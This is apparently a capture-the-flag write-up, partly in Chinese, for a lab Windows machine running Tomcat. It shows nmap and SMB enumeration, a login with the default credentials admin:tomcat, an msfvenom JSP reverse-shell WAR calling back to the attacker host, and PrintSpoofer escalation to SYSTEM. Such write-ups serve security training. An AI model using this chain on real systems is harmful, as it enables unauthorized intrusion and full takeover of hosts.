## port scan

```shell
# Nmap 7.94SVN scan initiated Sun Dec  8 01:12:31 2024 as: nmap -sT --min-rate=5000 -p- -oN nmap_result/port 192.168.56.137
Nmap scan report for 192.168.56.137
Host is up (0.00076s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
MAC Address: 08:00:27:80:AE:3A (Oracle VirtualBox virtual NIC)
```

```shell
# Nmap 7.94SVN scan initiated Sun Dec  8 01:07:02 2024 as: nmap -sT -sV -sC -O -p135,139,445,5040,8080 -oN nmap_result/detil 192.168.56.137
Nmap scan report for 192.168.56.137
Host is up (0.0052s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
8080/tcp open  http          Apache Tomcat 11.0.1
|_http-title: Apache Tomcat/11.0.1
|_http-favicon: Apache Tomcat
MAC Address: 08:00:27:80:AE:3A (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-08T22:09:39
|_  start_date: N/A
|_nbstat: NetBIOS name: WAR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:80:ae:3a (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 15h59m58s
```

vuln scan

```shell
# Nmap 7.94SVN scan initiated Sun Dec  8 01:10:40 2024 as: nmap --script=vuln -p135,139,445,5040,8080 -oN nmap_result/vuln 192.168.56.137
Nmap scan report for 192.168.56.137
Host is up (0.00074s latency).

PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5040/tcp open  unknown
8080/tcp open  http-proxy
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|   /manager/html/upload: Apache Tomcat (401 )
|_  /manager/html: Apache Tomcat (401 )
MAC Address: 08:00:27:80:AE:3A (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
```

139，445 smb服务

开放8080端口，tomcat服务

## smb

**Basic Enumeration**

```shell
┌──(kali㉿kali)-[~/vulnyx/War]
└─$ netexec smb 192.168.56.137
SMB         192.168.56.137  445    WAR              [*] Windows 10 / Server 2019 Build 19041 x64 (name:WAR) (domain:WAR) (signing:False) (SMBv1:False)
```

Windows 10

**shares  Enumeration**

```shell
┌──(kali㉿kali)-[~/vulnyx/War]
└─$ smbclient -L 192.168.56.137
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

```shell
┌──(kali㉿kali)-[~/vulnyx/War]
└─$ smbmap --no-banner -H 192.168.56.137
[*] Detected 1 hosts serving SMB
[*] Established 0 SMB connections(s) and 0 authenticated session(s)
[*] Closed 0 connections 
```

```shell
┌──(kali㉿kali)-[~/vulnyx/War]
└─$ netexec smb 192.168.56.137 --shares -u 'guest' -p ''
SMB         192.168.56.137  445    WAR              [*] Windows 10 / Server 2019 Build 19041 x64 (name:WAR) (domain:WAR) (signing:False) (SMBv1:False)
SMB         192.168.56.137  445    WAR              [-] WAR\guest: STATUS_ACCOUNT_DISABLED
```

**RPC Enumeration**

```shell
┌──(kali㉿kali)-[~/vulnyx/War]
└─$ rpcclient -NU "" 192.168.56.137 -c "srvinfo"
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

## tomcat

默认密码

```
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
```

`admin:tomcat`

进行war包部署

使用`msfvenom`生成一个war包

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.138 LPORT=1234 -f war > shell.war
```

![image-20241208154353780](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208154353780.png)

上传成功后，会有一个/shell的路径，访问，拿到shell

```shell
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 1234 
listening on [any] 1234 ...
connect to [192.168.56.138] from (UNKNOWN) [192.168.56.137] 49687
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 11.0>whoami
whoami
nt authority\local service
```

## 提权

现在是`nt authority\local service`权限

```cmd
C:\Program Files\Apache Software Foundation\Tomcat 11.0>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

SeImpersonatePrivilege 身份验证后模拟客户端

当启用“身份验证后模拟客户端”用户权限时，它允许指定的用户或程序模拟经过身份验证的客户端，并代表该用户执行操作。这个安全设置有助于防止未授权的服务器通过远程过程调用（RPC）或命名管道等方法模拟连接到它的客户端

https://github.com/itm4n/PrintSpoofer

使用`PrintSpoofer`进行提权

将文件传到靶机里

首先使用`impacket-smbserver`开启一个smb服务

```shell
┌──(kali㉿kali)-[~/vulnyx/War]
└─$ impacket-smbserver a . -smb2support
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

进入临时目录进行操作

```
C:\Program Files\Apache Software Foundation\Tomcat 11.0>cd %temp%

C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp>copy \\192.168.56.138\a\PrintSpoofer64.exe PrintSpoofer64.exe
```

```cmd
C:\Windows\SERVIC~1\LOCALS~1\AppData\Local\Temp>.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

现在是`nt authority\system`,可以读取flag

```
type c:\users\low\desktop\user.txt
type c:\users\administrator\desktop\root.txt
```

